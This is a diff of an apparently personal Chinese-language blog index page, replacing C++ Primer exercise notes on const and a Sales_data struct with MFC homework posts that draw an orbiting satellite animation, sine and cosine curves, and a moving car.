-<li>For each of the following declarations indicate whether the object being declared has top-level or low-level const.<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="label">const</span> int <span class="literal">v2</span> = <span class="number">0</span><span class="comment">; int v1 = v2;</span></span><br><span class="line"><span class="label">int</span> *<span class="literal">p1</span> = &amp;<span class="literal">v1</span>, &amp;<span class="literal">r1</span> = <span class="literal">v1</span><span class="comment">;</span></span><br><span class="line"><span class="label">const</span> int *<span class="literal">p2</span> = &amp;<span class="literal">v2</span>, *const <span class="literal">p3</span> = &amp;i, &amp;<span class="literal">r2</span> = <span class="literal">v2</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>根据定义很容易判断v2是顶层const，p2是底层const，因为p3是一个指向常量的指针(point to const)，它本身又是一个常量，所以说它既是底层const，又是顶层const。</p>
-<ul>
-<li>2.40</li>
-<li><p>Write your own version of the Sales_data class.</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> Sales_data&#123;</span><br><span class="line">   <span class="built_in">std</span>::<span class="built_in">string</span> bookNo;</span><br><span class="line">   <span class="built_in">std</span>::<span class="built_in">string</span> bookName;</span><br><span class="line">   <span class="built_in">std</span>::<span class="built_in">string</span> bookPublish;</span><br><span class="line">   <span class="built_in">std</span>::<span class="built_in">string</span> ISBN;</span><br><span class="line">   <span class="keyword">int</span> soldnum=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">double</span> revenue=<span class="number">0.0</span>;</span><br><span class="line">   <span class="keyword">double</span> price = <span class="number">0.0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>2.41</p>
-</li>
-<li>Use your Sales_data class to rewrite the exercises in § 1.5.1(p. 22), § 1.5.2(p. 24), and § 1.6(p. 25). For now, you should define your Sales_data class in the same file as your main function.</li>
-</ul>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">struct</span> Sales_data</span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">std</span>::<span class="built_in">string</span> bookNo;</span><br><span class="line">   <span class="keyword">int</span> soldnum;</span><br><span class="line">   <span class="keyword">double</span> revenue = <span class="number">0.0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    Sales_data book;</span><br><span class="line">    doublr price;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>&gt;&gt;book.bookNo&gt;&gt;book.soldnum&gt;&gt;price;</span><br><span class="line">    book.revenue=price*book.soldnum;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;book.bookNo&lt;&lt;<span class="string">" "</span>&lt;&lt;book.soldnum&lt;&lt;<span class="string">" "</span>&lt;&lt;book.revenue&lt;&lt;<span class="string">" "</span>&lt;&lt;price;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这个应该在学谭爷爷的c的时候就会了+_+   还有一个<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> Sale_data</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> bookNo;</span><br><span class="line">    <span class="keyword">unsigned</span> units_sold = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">double</span> revenue = <span class="number">0.0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    Sale_data book1, book2;</span><br><span class="line">    <span class="keyword">double</span> price1, price2;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; book1.bookNo &gt;&gt; book1.units_sold &gt;&gt; price1;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; book2.bookNo &gt;&gt; book2.units_sold &gt;&gt; price2;</span><br><span class="line">    book1.revenue = book1.units_sold * price1;</span><br><span class="line">    book2.revenue = book2.units_sold * price2;</span><br><span class="line">    <span class="keyword">if</span> (book1.bookNo == book2.bookNo)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> totalCnt = book1.units_sold + book2.units_sold;</span><br><span class="line">        <span class="keyword">double</span> totalRevenue = book1.revenue + book2.revenue;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; book1.bookNo &lt;&lt; <span class="string">" "</span> &lt;&lt; totalCnt &lt;&lt; <span class="string">" "</span> &lt;&lt; totalRevenue &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">        <span class="keyword">if</span> (totalCnt != <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; totalRevenue / totalCnt &lt;&lt; <span class="built_in">std</span>::endl;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"(no sales)"</span> &lt;&lt; <span class="built_in">std</span>::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">"Data must refer to same ISBN"</span> &lt;&lt; <span class="built_in">std</span>::endl;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;  <span class="comment">// indicate failure</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>这不就是那个书店程序么……</p>
-<hr>
-<p>应该是还有一个程序的，今天来不及弄了，自定义数据结构其实第一章也提到了一些。这样子关于变量和基本类型的东西基本就搞完了。但是里面还有很多我没能搞明白的东西，《c++ primer》作为一本工具书应该是用来查阅的，写这些例题也算是慢慢把c++重新学一遍吧，加油！</p>
 
       
     </div>
@@ -529,7 +462,103 @@
       
       
 	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C++</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Metasploit/">Metasploit</a></li></ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/渗透入侵/">渗透入侵</a>
+	</div>
+
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-2015-11-19-mfc" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2015/11/19/2015-11-19-mfc/" class="article-date">
+  	<time datetime="2015-11-19T04:56:48.000Z" itemprop="datePublished">2015-11-19</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/11/19/2015-11-19-mfc/">MFC POJ3</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="MFC_u7684_u4F5C_u4E1A"><a href="#MFC_u7684_u4F5C_u4E1A" class="headerlink" title="MFC的作业"></a>MFC的作业</h2><ul>
+<li>设计基于单文档/视图结构的程序。绘制2条圆形轨道，然后设计2个卫星（圆形代替），使其分别沿内外轨迹匀速行走。轨道路宽度、半径、颜色由轨道设定菜单加对话框指定；有开始、结束菜单；有高速、中速、低速三个菜单控制卫星速度；卫星颜色、标号由按下鼠标左键加对话框指定。</li>
+<li>简单分析：两个圆形轨道和卫星应该是用Ellipse()函数实现，匀速行走则是通过定时器来实现，至于菜单对话框什么的都不是很复杂。说白了这个题目并没有什么难度，只是说考察的点很多，比较繁琐。</li>
+</ul>
+<h3 id="u8BBE_u8BA1_u83DC_u5355"><a href="#u8BBE_u8BA1_u83DC_u5355" class="headerlink" title="设计菜单"></a>设计菜单</h3><p>菜单包括:Status(Start/Stop)、Speed(High/Medium/Low)、Preferences(Width/Radii/Color)。<br>还有添加一个鼠标左键消息处理函数。<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">void</span> CSatelliteView<span class="tag">::OnStart</span>() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>	CSatelliteDoc *pDoc=GetDocument();	ASSERT_VALID(pDoc);	SetTimer(<span class="number">1</span>,<span class="number">100</span>,<span class="built_in">NULL</span>);	&#125;<span class="literal">void</span> CSatelliteView<span class="tag">::OnStop</span>() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>	CSatelliteDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	KillTimer(<span class="number">1</span>);	&#125;<span class="literal">void</span> CSatelliteView<span class="tag">::OnHigh</span>() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>	CSatelliteDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	pDoc<span class="subst">-&gt;</span>m_speed = <span class="number">1.0</span>;	&#125;<span class="literal">void</span> CSatelliteView<span class="tag">::OnMedium</span>() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>	CSatelliteDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	pDoc<span class="subst">-&gt;</span>m_speed = <span class="number">0.5</span>;	&#125;<span class="literal">void</span> CSatelliteView<span class="tag">::OnLow</span>() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>	CSatelliteDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	pDoc<span class="subst">-&gt;</span>m_speed = <span class="number">0.1</span>;&#125;<span class="literal">void</span> CSatelliteView<span class="tag">::OnWidth</span>() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>	CSatelliteDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	Width dlgInput;	int nRet = dlgInput<span class="built_in">.</span>DoModal();	<span class="keyword">if</span>(nRet == IDOK)	&#123;		pDoc<span class="subst">-&gt;</span>m_widthDoc=dlgInput<span class="built_in">.</span>m_width;		pDoc<span class="subst">-&gt;</span>m_widthDocx=dlgInput<span class="built_in">.</span>m_widthx;		Invalidate();	&#125;	&#125;<span class="literal">void</span> CSatelliteView<span class="tag">::OnRadii</span>() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>	CSatelliteDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	Radii dlgInput;	int nRet = dlgInput<span class="built_in">.</span>DoModal();	<span class="keyword">if</span>(nRet == IDOK)	&#123;		pDoc<span class="subst">-&gt;</span>m_radiiDoc=dlgInput<span class="built_in">.</span>m_radii;		pDoc<span class="subst">-&gt;</span>m_radiiDocx=dlgInput<span class="built_in">.</span>m_radiix;		Invalidate();	&#125;		&#125;<span class="literal">void</span> CSatelliteView<span class="tag">::OnColor</span>() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>	CSatelliteDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	CColorDialog dlg;	<span class="keyword">if</span>(dlg<span class="built_in">.</span>DoModal() == IDOK)	&#123;		pDoc<span class="subst">-&gt;</span>m_orbitCol<span class="subst">or</span>=dlg<span class="built_in">.</span>GetCol<span class="subst">or</span>();		Invalidate();	&#125;	&#125;<span class="literal">void</span> CSatelliteView<span class="tag">::OnLButtonDown</span>(UINT nFlags, CPoint point) &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your message handler code here and/or call default</span>	CSatelliteDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	CColorDialog dlg;	<span class="keyword">if</span>(dlg<span class="built_in">.</span>DoModal() == IDOK)	&#123;		pDoc<span class="subst">-&gt;</span>m_satelliteCol<span class="subst">or</span>=dlg<span class="built_in">.</span>GetCol<span class="subst">or</span>();		Invalidate();	&#125;	CView<span class="tag">::OnLButtonDown</span>(nFlags, point);&#125;<span class="literal">void</span> CSatelliteView<span class="tag">::OnTimer</span>(UINT nIDEvent) &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your message handler code here and/or call default</span>	CSatelliteDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	pDoc<span class="subst">-&gt;</span>m_angle += pDoc<span class="subst">-&gt;</span>m_speed;	Invalidate();	CView<span class="tag">::OnTimer</span>(nIDEvent);&#125;</span><br></pre></td></tr></table></figure></p>
+<p>代码并不是特别的复杂，只是比较繁琐，至于创建类，声明变量之类的就不一一赘述了。  </p>
+<h3 id="u7ED8_u56FE"><a href="#u7ED8_u56FE" class="headerlink" title="绘图"></a>绘图</h3><p>我做了一个响应式的布局，思路大概是先获得用户区的大小，然后算出中点。以该中点为圆心画出两个半径为用户指定的同心圆。注意画笔的选择，画刷选择为空，否则大圆会覆盖小圆。<br>通过公式计算出两个圆上的点来确定卫星的圆心，然后以卫星的圆心画半径为定值的圆，通过定时器不断重绘从而让它运动起来。<br>详细的代码如下:</p>
+<pre><code class="c++">void CSatelliteView::OnDraw(CDC* pDC)
+{
+    CSatelliteDoc* pDoc = GetDocument();
+    ASSERT_VALID(pDoc);
+    CRect rectClient;
+    GetClientRect(&amp;rectClient);
+    double x,y;
+    x=(rectClient.right-rectClient.left)/2;
+    y=(rectClient.bottom-rectClient.top)/2;
+    pDC-&gt;SelectStockObject(NULL_BRUSH);
+    CPen newPen;
+    CPen newPenx;
+    CPen newPen_satellite;
+    newPen.CreatePen(PS_SOLID,pDoc-&gt;m_widthDoc,pDoc-&gt;m_orbitColor);
+    newPen_satellite.CreatePen(PS_SOLID,2,pDoc-&gt;m_satelliteColor);
+    newPenx.CreatePen(PS_SOLID,pDoc-&gt;m_widthDocx,pDoc-&gt;m_orbitColor);
+    CPen *poldPen;
+    poldPen=pDC-&gt;SelectObject(&amp;newPen);
+    pDC-&gt;Ellipse(x-pDoc-&gt;m_radiiDoc,y-pDoc-&gt;m_radiiDoc,x+pDoc-&gt;m_radiiDoc,y+pDoc-&gt;m_radiiDoc);
+    poldPen=pDC-&gt;SelectObject(&amp;newPenx);
+    pDC-&gt;Ellipse(x-pDoc-&gt;m_radiiDocx,y-pDoc-&gt;m_radiiDocx,x+pDoc-&gt;m_radiiDocx,y+pDoc-&gt;m_radiiDocx);
+    poldPen=pDC-&gt;SelectObject(&amp;newPen_satellite);
+    pDC-&gt;Ellipse(x+pDoc-&gt;m_radiiDoc*cos(pDoc-&gt;m_angle)-15,y+pDoc-&gt;m_radiiDoc*sin(pDoc-&gt;m_angle)-15,x+pDoc-&gt;m_radiiDoc*cos(pDoc-&gt;m_angle)+15,y+pDoc-&gt;m_radiiDoc*sin(pDoc-&gt;m_angle)+15);
+    pDC-&gt;Ellipse(x+pDoc-&gt;m_radiiDocx*cos(pDoc-&gt;m_angle)-15,y+pDoc-&gt;m_radiiDocx*sin(pDoc-&gt;m_angle)-15,x+pDoc-&gt;m_radiiDocx*cos(pDoc-&gt;m_angle)+15,y+pDoc-&gt;m_radiiDocx*sin(pDoc-&gt;m_angle)+15);
+    // TODO: add draw code for native data here
+}
+</code></pre>
+<p>我觉得我写的简直乱到一定程度了-_-#   </p>
+<h3 id="u5C0F_u7ED3"><a href="#u5C0F_u7ED3" class="headerlink" title="小结"></a>小结</h3><p>这个程序几乎是一气呵成的，编译一遍通过简直感人。但是这个程序还是有很多细节有待完善，比如说设置初始值的问题。个人认为用户在打开这个程序的时候应该是两个卫星在跑而不是一片空白，用户根据自己的个性化需求更改一些参数，这样看起来会更友好一些。单论MFC的文档/视图结构的话貌似并没什么太复杂的内容，整个就是一个大模版，只要你循规蹈矩，解出这些水题也就是时间问题吧=_=</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C++</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MFC/">MFC</a></li></ul>
 	</div>
 
       
@@ -555,11 +584,11 @@
 
 
   
-    <article id="post-2015-10-14-markdown" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-2015-11-17-mfc" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2015/10/14/2015-10-14-markdown/" class="article-date">
-  	<time datetime="2015-10-14T02:40:27.000Z" itemprop="datePublished">2015-10-14</time>
+      <a href="/2015/11/17/2015-11-17-mfc/" class="article-date">
+  	<time datetime="2015-11-17T13:21:08.000Z" itemprop="datePublished">2015-11-17</time>
 </a>
     </div>
   
@@ -572,7 +601,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2015/10/14/2015-10-14-markdown/">使用markdown排版</a>
+      <a class="article-title" href="/2015/11/17/2015-11-17-mfc/">MFC POJ2</a>
     </h1>
   
 
@@ -581,20 +610,271 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>终于从使用html标签的排版方式进化到了Markdown排版，我们来试试功能。</p>
-<h1 id="u8FD9_u662F_u4E2A_u6807_u9898"><a href="#u8FD9_u662F_u4E2A_u6807_u9898" class="headerlink" title="这是个标题"></a>这是个标题</h1><h2 id="u8FD9_u4E5F_u662F_u4E2A_u6807_u9898"><a href="#u8FD9_u4E5F_u662F_u4E2A_u6807_u9898" class="headerlink" title="这也是个标题"></a>这也是个标题</h2><h3 id="u5F3A_u884C_u518D_u8BD5_u4E00_u4E2A_u6807_u9898"><a href="#u5F3A_u884C_u518D_u8BD5_u4E00_u4E2A_u6807_u9898" class="headerlink" title="强行再试一个标题"></a>强行再试一个标题</h3><p>果然可以了嘛(￣▽￣)  再试试别的功能。<br>我们来引用试试：</p>
+        <h2 id="MFC_u7684_u4F5C_u4E1A"><a href="#MFC_u7684_u4F5C_u4E1A" class="headerlink" title="MFC的作业"></a>MFC的作业</h2><ul>
+<li>用规定的颜色绘制正弦、余弦曲线。由菜单或对话框定颜色。</li>
+<li>这个看起来如此简单的东西耗费了我半天的时间ಥ_ಥ，大部分时间用在了调一个令人无语的bug上。</li>
+</ul>
+<p>首先我做了下菜单，包括一个颜色选择菜单(弹出颜色选择对话框)，一个模式选择的下拉菜单(画正弦还是画余弦)。   </p>
+<p>做完菜单以后给它们添加消息处理函数。  </p>
+<ol>
+<li><p>颜色选择:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改消息映射函数，添加使用颜色选择公用对话框</span></span><br><span class="line"><span class="keyword">void</span> CFunctioncurveView::OnInput() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>	CFunctioncurveDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	<span class="function">CColorDialog <span class="title">colordlg</span><span class="params">(pDoc-&gt;m_brush)</span></span>; 	pDoc-&gt;m_brush = RGB(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>); 	<span class="keyword">if</span>(colordlg.DoModal()== IDOK)	&#123;		pDoc-&gt;m_brush = colordlg.GetColor();	    pDoc-&gt;m_boolNew=<span class="literal">false</span>;		InvalidateRect(<span class="literal">NULL</span>);     &#125;&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>模式选择</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里我在Document类声明中添加了一个model变量，用它来做选择结构</span></span><br><span class="line"><span class="keyword">void</span> CFunctioncurveView::OnsinFunc() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>	CFunctioncurveDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	pDoc-&gt;model = <span class="number">0</span>;	&#125;<span class="keyword">void</span> CFunctioncurveView::OncosFunc() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>	CFunctioncurveDoc *pDoc = GetDocument();	ASSERT_VALID(pDoc);	pDoc-&gt;model = <span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>声明什么的我就不写了，下面是修改OnDraw()成员函数。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> CFunctioncurveView::OnDraw(CDC* pDC)&#123;	CFunctioncurveDoc* pDoc = GetDocument();	ASSERT_VALID(pDoc);	<span class="keyword">const</span> <span class="keyword">double</span> PI=<span class="number">3.14159265359</span>;	<span class="keyword">const</span> <span class="keyword">double</span> dbYMax=<span class="number">1.0</span>;	<span class="keyword">const</span> <span class="keyword">double</span> dbYMin=-<span class="number">1.0</span>;	<span class="keyword">const</span> <span class="keyword">double</span> dbXMin=<span class="number">0.0</span>;	<span class="keyword">const</span> <span class="keyword">double</span> dbXMax=<span class="number">2</span>*PI;	<span class="keyword">const</span> <span class="keyword">int</span> iPt = <span class="number">200</span>;	<span class="keyword">const</span> <span class="keyword">int</span> xOrg = <span class="number">50</span>;	<span class="keyword">const</span> <span class="keyword">int</span> yOrg = <span class="number">350</span>;	<span class="keyword">const</span> <span class="keyword">int</span> xMax = <span class="number">700</span>;	<span class="keyword">const</span> <span class="keyword">int</span> yMin = <span class="number">20</span>;	<span class="keyword">double</span> dbXRatio=(xMax-xOrg)/(dbXMax-dbXMin);    <span class="keyword">double</span> dbYRatio=(yOrg-yMin)/(dbYMax-dbYMin);    <span class="keyword">int</span> x = xOrg;    <span class="keyword">int</span> y = yOrg;	<span class="keyword">if</span>(!pDoc-&gt;m_boolNew) <span class="comment">//声明的m_boolNew是为了让新建文档为空白视图</span>	&#123;	    		pDC-&gt;MoveTo(x,y);	    CPen penNew,*ppenOld; 	   	penNew.CreatePen(PS_SOLID,<span class="number">2</span>,pDoc-&gt;m_brush);	    ppenOld=pDC-&gt;SelectObject(&amp;penNew); <span class="comment">//选择画笔颜色</span>		<span class="keyword">if</span>(pDoc-&gt;model == <span class="number">0</span>) <span class="comment">//判断画正弦还是余弦</span>		&#123;    	    <span class="keyword">for</span> (<span class="keyword">int</span> i =<span class="number">0</span>;i &lt;= iPt; i++)			&#123;	  	          x = (<span class="keyword">int</span>)(dbXRatio*(dbXMax/iPt*i-dbXMin)+xOrg);		      y = (<span class="keyword">int</span>)(yOrg-dbYRatio*(<span class="built_in">sin</span>(dbXMax/iPt*i)-dbYMin));		      pDC-&gt;LineTo(x,y);			&#125;		&#125;		<span class="keyword">else</span>		&#123;	        <span class="keyword">for</span> (<span class="keyword">int</span> i =<span class="number">0</span>;i &lt;= iPt; i++)			&#123;	  		      x = (<span class="keyword">int</span>)(dbXRatio*(dbXMax/iPt*i-dbXMin)+xOrg);		      y = (<span class="keyword">int</span>)(yOrg-dbYRatio*(<span class="built_in">cos</span>(dbXMax/iPt*i)-dbYMin));		      pDC-&gt;LineTo(x,y);			&#125;		 		&#125;		pDC-&gt;SelectObject(ppenOld);		penNew.DeleteObject();<span class="comment">//用完画笔后要及时销毁，否则再次创建的时候会报错</span>		pDC-&gt;MoveTo(xOrg,yOrg);		pDC-&gt;LineTo(xMax,yOrg);		pDC-&gt;MoveTo(xOrg,yOrg);		pDC-&gt;LineTo(xOrg,yMin);		x=(xMax-xOrg)/<span class="number">2</span>;		y=yOrg+<span class="number">10</span>;        pDC-&gt;TextOut(x,y,<span class="string">"X"</span>);		x=xOrg-<span class="number">20</span>;		y=(yOrg-yMin)/<span class="number">2</span>;		pDC-&gt;TextOut(x,y,<span class="string">"Y"</span>);	&#125;	<span class="keyword">else</span> 	&#123;		CRect rectClient;		GetClientRect(rectClient);		pDC-&gt;FillSolidRect(rectClient,RGB(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>));	&#125;	<span class="comment">// <span class="doctag">TODO:</span> add draw code for native data here</span>&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="u5C0F_u7ED3"><a href="#u5C0F_u7ED3" class="headerlink" title="小结"></a>小结</h3><p>这个题用的时间比较长的原因有有两个:第一个问题在于我错误的认为brush是pen，然后搞brush类半天什么也画不出来。还有一个问题就是我在给sin/cos创建消息映射函数的时候把成员函数的名字作死命名为sin/cos，后来将math.h包括进来的时候编译器报错,因为我重复定义了sin和cos……还是很感谢<a href="http://lyeec.me" target="_blank" rel="external">@Lyeec</a>帮我找出了问题所在(<em>_</em>)</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C++</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MFC/">MFC</a></li></ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/编程学习/">编程学习</a>
+	</div>
+
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-2015-11-16-mfc" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2015/11/16/2015-11-16-mfc/" class="article-date">
+  	<time datetime="2015-11-16T13:21:08.000Z" itemprop="datePublished">2015-11-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/11/16/2015-11-16-mfc/">MFC POJ1</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>##MFC的作业</p>
+<ul>
+<li>设计基于单文档/视图结构的程序。绘制一条直的道路，然后然后设计一个小车（矩形代替，有车号），使其沿道路匀速行走，到终点自动返回，来回行走。道路的宽度、长度由设定菜单完成；还有开始、结束菜单；有高速、中速、低速三个菜单控制小车速度。</li>
+<li>简要分析下：主要用到的知识有：单文档界面(SDI)应用程序，利用ClassWizard编制消息处理函数，定时器消息，客户区重绘等等……</li>
+<li>实现    </li>
+</ul>
+<p>修改文档类的定义，添加成员变量：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> CCarsDoc : <span class="keyword">public</span> CDocument&#123;<span class="keyword">protected</span>: <span class="comment">// create from serialization only</span>	CCarsDoc();	DECLARE_DYNCREATE(CCarsDoc)<span class="comment">// Attributes</span><span class="keyword">public</span>:   CRect m_rectCar;   <span class="keyword">int</span> speed;<span class="comment">// Operations</span><span class="keyword">public</span>:<span class="comment">// Overrides</span></span><br></pre></td></tr></table></figure></p>
